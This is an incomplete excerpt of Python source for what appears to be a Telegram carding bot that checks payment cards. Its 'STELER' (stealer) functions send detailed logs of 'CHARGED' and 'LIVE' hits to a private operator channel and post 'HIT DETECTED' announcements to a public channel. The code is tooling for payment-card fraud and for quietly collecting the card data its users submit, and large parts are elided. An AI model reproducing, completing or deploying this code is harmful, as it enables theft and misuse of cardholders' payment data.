...
STELER_PUBLIC_CHANNEL = -1003771620838     # Your PUBLIC channel ID for showing "HIT DETECTED"
SEND_TO_STELER = True                        # Set to True to enable

# Hit detected message format (like your screenshot)
HIT_DETECTED_TEMPLATE = """<b>⚡ HIT DETECTED ⚡</b>
━━━━━━━━━━━━━━━━━━━
...
# ================== STELER HIT LOGS FUNCTIONS ==================
async def send_to_private_steler(result, user_info, hit_type):
    """Send detailed hit info to PRIVATE channel/group"""
    if not SEND_TO_STELER or not STELER_PRIVATE_CHANNEL:
        return
    ...
    hit_text = "CHARGED HIT" if hit_type == "CHARGED" else "LIVE HIT"
    
    message = f"""{hit_emoji} <b>{hit_text}</b> {hit_emoji}
━━━━━━━━━━━━━━━━━━━
...
🤖 <b>Bot By:</b> {BOT_NAME_STYLED}"""
    ...
    try:
        await bot.send_message(STELER_PRIVATE_CHANNEL, premium_emoji(message), parse_mode='html')
...
async def send_realtime_hit(user_id, result, hit_type, username, group_id=None, reply_to=None):
    ...
    # Send to PRIVATE steler channel (detailed logs)
    ...
    # Send to PUBLIC channel (HIT DETECTED message)
    await send_to_public_channel(result, user_info, hit_type_full)
    
    # Original message to user
